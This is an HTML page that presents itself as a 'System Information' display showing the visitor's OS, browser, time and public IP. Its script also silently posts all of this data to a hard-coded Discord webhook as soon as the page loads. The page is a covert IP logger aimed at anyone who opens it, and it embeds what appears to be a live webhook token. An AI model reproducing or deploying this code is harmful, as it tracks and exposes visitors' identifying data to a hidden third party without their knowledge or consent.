<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Information</title>
</head>
<body>
    <h1>System Information</h1>
    <div id="output">
        <p id="os">OS: </p>
        <p id="browser">Browser: </p>
        <p id="time">Current Time (EST): </p>
        <p id="public-ip">Public IP: </p>
    </div>

    <script>
        async function getOsInfo() {
            return navigator.platform;
        }

        async function getBrowserInfo() {
            return navigator.userAgent;
        }

        function getTimeInfo() {
            const estTime = new Date().toLocaleString("en-US", {timeZone: "America/New_York"});
            return estTime;
        }

        async function getPublicIp() {
            const publicIp = await fetch('https://api64.ipify.org?format=json')
                                .then(response => response.json())
                                .then(data => data.ip);
            return `<a href="https://whatismyipaddress.com/ip/${publicIp}" target="_blank">${publicIp}</a>`;
        }

        async function sendToDiscord(message) {
            const webhookUrl = 'https://discord.com/api/webhooks/1205983897767383140/o3xlSmIOb4_kTtjX_ThqMBxOTyUgFvZePPr0_vWPU9Ys9f9UF-waGD08P6txUBc3SECG';
            const payload = { content: message };
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        async function main() {
            const outputDiv = document.getElementById('output');
            try {
                const osInfo = await getOsInfo();
                const browserInfo = await getBrowserInfo();
                const timeInfo = getTimeInfo();
                const publicIp = await getPublicIp();

                document.getElementById('os').innerHTML += osInfo;
                document.getElementById('browser').innerHTML += browserInfo;
                document.getElementById('time').innerHTML += timeInfo;
                document.getElementById('public-ip').innerHTML += publicIp;

                const message = `${osInfo}\n${browserInfo}\n${timeInfo}\n${publicIp}`;
                await sendToDiscord(message);
            } catch (error) {
                console.error('Error:', error);
                outputDiv.textContent = 'Error: ' + error;
            }
        }

        main();
    </script>
</body>
</html>
